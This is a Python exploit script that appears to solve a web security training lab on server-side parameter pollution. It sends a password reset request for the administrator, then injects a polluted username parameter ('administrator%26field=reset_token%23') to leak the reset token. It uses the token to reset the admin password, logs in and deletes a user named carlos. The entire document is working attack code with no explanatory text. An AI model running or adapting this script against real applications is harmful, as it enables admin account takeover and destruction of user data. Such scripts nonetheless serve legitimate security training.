# Exploiting server-side parameter pollution in a query string

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import json
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t\t%s' % csrf)
	return csrf

def generate_reset_token(s, url):
	print('[+] Trying to generate a reset password token for administrator user...')
	reset_pass_path = url + '/forgot-password'
	r = s.get(reset_pass_path)
	time.sleep(1)
	csrf = get_csrf_token(r)
	reset_pass_data = {
	'csrf': csrf,
	'username': 'administrator'
	}
	r = s.post(reset_pass_path, data=reset_pass_data)
	time.sleep(1)
	if r.status_code == 200:
		print('[+] Successfully generated reset password token for admin !')
	else:
		print('[-] Exploit failed to generate reset password token for admin user <!>')

def get_reset_token(s, url):
	print('\n[+] Trying to retrieve the reset password token for administrator user...')
	reset_pass_path = url + '/forgot-password'
	r = s.get(reset_pass_path)
	time.sleep(1)
	csrf = get_csrf_token(r)
	reset_pass_data = {
	'csrf': csrf,
	'username': 'administrator%26field=reset_token%23'
	}
	print(reset_pass_data)
	r = s.post(reset_pass_path, data=reset_pass_data)
	token = json.loads(r.text)['result']
	if r.status_code == 200 and token:
		print(f'[+] Found reset password Token:\t{token}')
		return token
	else:
		print("[-] Failed to retrieve reset_token for administrator <!>")
		sys.exit(1)

def get_js(s, url):
	js_path = url + '/static/js/forgotPassword.js'
	r = s.get(js_path)
	print(r.text)

def reset_admin_pass(s, url, token):
	print('\n[+] Trying to change administrator password...')
	reset_passwd_path = url + '/forgot-password?reset_token=' + token
	r = s.get(reset_passwd_path)
	csrf = get_csrf_token(r)
	change_passwd_data = {
	'csrf': csrf,
	'reset_token': token,
	'new-password-1': 'newpassword',
	'new-password-2': 'newpassword'
	}
	r = s.post(reset_passwd_path, data=change_passwd_data, allow_redirects=False)
	if r.status_code == 302:
		print("[+] Successfully reseted Admin's password !")
	else:
		print("[-] Failed to reset Admin's password <!>")
		sys.exit(1)

def connect_as_admin(s, url):
	print('\n[+] Trying to connect to the application as administrator...')
	login_path = url + '/login'
	r = s.get(login_path)
	time.sleep(1)
	csrf = get_csrf_token(r)
	login_data = {
	'csrf': csrf,
	'username': 'administrator',
	'password': 'newpassword'
	}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	if 'Your username is: administrator' in r.text:
		print('[+] Logged in as Admin !')
		return r
	print('[-] Failed to log in as Admin <!>')
	sys.exit(1)

def delete_carlos(s, url):
	print('[+] Trying to delete Carlos user...')
	delete_path = url + '/admin/delete?username=carlos'
	r = s.get(delete_path)
	time.sleep(1)
	if 'User deleted' in r.text:
		print('[+] Successfully removed Carlos user !')
	else:
		print('[-] Exploit failed to remove Carlos user <!>')
		sys.exit(1)


def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Exploiting server-side parameter pollution in a query string')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos user...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			time.sleep(2)

			generate_reset_token(s, url)
			token = get_reset_token(s, url)
			reset_admin_pass(s, url, token)
			connect_as_admin(s, url)
			delete_carlos(s, url)

			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
